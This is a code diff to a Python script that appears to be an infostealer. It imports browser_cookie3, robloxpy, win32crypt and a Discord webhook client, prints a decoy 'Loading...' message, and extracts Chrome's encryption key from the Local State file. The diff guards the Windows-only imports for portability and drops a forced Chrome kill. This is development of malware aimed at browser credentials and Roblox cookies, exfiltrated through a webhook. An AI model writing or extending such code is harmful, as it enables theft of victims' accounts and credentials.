@@ -5,18 +5,20 @@ import browser_cookie3
 import sqlite3
 import subprocess
 import shutil
-import win32crypt
 from Crypto.Cipher import AES
 from discordwebhook import Discord
 import httpx
 import re
 import requests
 import robloxpy
+import platform
 
-try:
-    subprocess.call("TASKKILL /f /IM CHROME.EXE")
-except FileNotFoundError:
-    print("")
+# Check if the current system is Windows, because win32crypt is Windows-specific
+is_windows = platform.system() == "Windows"
+
+# Avoid using win32crypt if the system is not Windows
+if is_windows:
+    import win32crypt
 
 webhook_url = 'your_webhook_url_here'
 
@@ -24,6 +26,9 @@ dummy_message = "Loading..."
 print(dummy_message)
 
 def get_encryption_key():
+    if not is_windows:
+        return None  # Return None if not on Windows
+
     local_state_path = os.path.join(os.environ["USERPROFILE"],
                                     "AppData", "Local", "Google", "Chrome",
                                     "User Data", "Local State")
